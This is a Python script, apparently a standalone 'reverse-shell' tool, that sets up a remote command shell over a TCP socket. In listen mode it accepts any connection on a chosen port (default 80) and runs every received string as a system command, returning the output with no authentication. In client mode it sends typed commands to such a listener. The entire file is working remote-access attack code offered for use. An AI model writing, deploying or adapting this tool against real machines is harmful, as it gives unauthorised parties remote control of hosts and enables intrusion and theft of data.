import socket
import argparse
import subprocess
import threading
import shlex

class Shell:
    def __init__(self, args):
        self.args = args
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        ip = self.args.ip
        port = self.args.port

        if self.args.listen:
            self.socket.bind((ip, port))
            self.socket.listen(128)

            while True:
                client, address = self.socket.accept()
                thread = threading.Thread(target=self.handle_client, args=(client, address))
                thread.start()

        else:
            self.socket.connect((ip, port))

            while True:
                cmd = input('# ')
                self.socket.send(cmd.encode())

                response = self.socket.recv(4096)
                print(response.decode())

    def handle_client(self, client, address):
        while True:
            try:
                cmd = client.recv(1024).strip().decode()
                if cmd:
                    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
                    client.send(output)

            except Exception as e:
                client.send(str(e).encode())


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='https://github.com/hu-jeff/reverse-shell')
    parser.add_argument('-ip')
    parser.add_argument('-p', '--port', help='port number', type=int, default=80)
    parser.add_argument('-l', '--listen', action='store_true', help='listen')

    args = parser.parse_args()
    shell = Shell(args)
    shell.run()